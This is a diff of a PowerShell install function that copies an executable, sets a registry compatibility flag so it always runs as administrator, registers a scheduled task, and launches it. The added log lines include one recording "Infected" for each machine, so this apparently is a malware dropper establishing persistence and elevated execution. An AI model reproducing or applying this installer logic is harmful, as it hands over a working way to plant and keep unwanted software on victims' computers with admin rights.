@@ -25,9 +25,11 @@ function Install()
         try {
             # Install
             Copy-Item -Path "$BaseDir$AppExe" -Destination $DestDir -ErrorAction Stop 2>&1 >> $LogFile
+            "$AppExe coped to $DestDir" | Out-File -Append -FilePath $LogFile
             
             # Always run application as admin
             New-ItemProperty -Path $AppCompatFlagsLayers -Name $InstallPath -Value "~ RUNASADMIN" -PropertyType String -Force | Out-File -Append -FilePath $LogFile
+            "$InstallPath set to always run as administrator" | Out-File -Append -FilePath $LogFile
 
             # Create task in task scheduler
             $action = New-ScheduledTaskAction -Execute $InstallPath
@@ -36,9 +38,12 @@ function Install()
             $settings = New-ScheduledTaskSettingsSet -DontStopIfGoingOnBatteries
             $task = New-ScheduledTask -Action $action -Principal $principle -Trigger $trigger -Settings $settings
             Register-ScheduledTask $App -InputObject $task
+            "Task scheduled successfully" | Out-File -Append -FilePath $LogFile
             
             # Start application
             Start-Process -FilePath $InstallPath | Out-File -Append -FilePath $LogFile
+
+            "Infected $Machine on $DateTime" | Out-File -Append -FilePath $LogFile
         } catch {
             $_.Exception.Message | Out-File -Append -FilePath $LogFile
         }
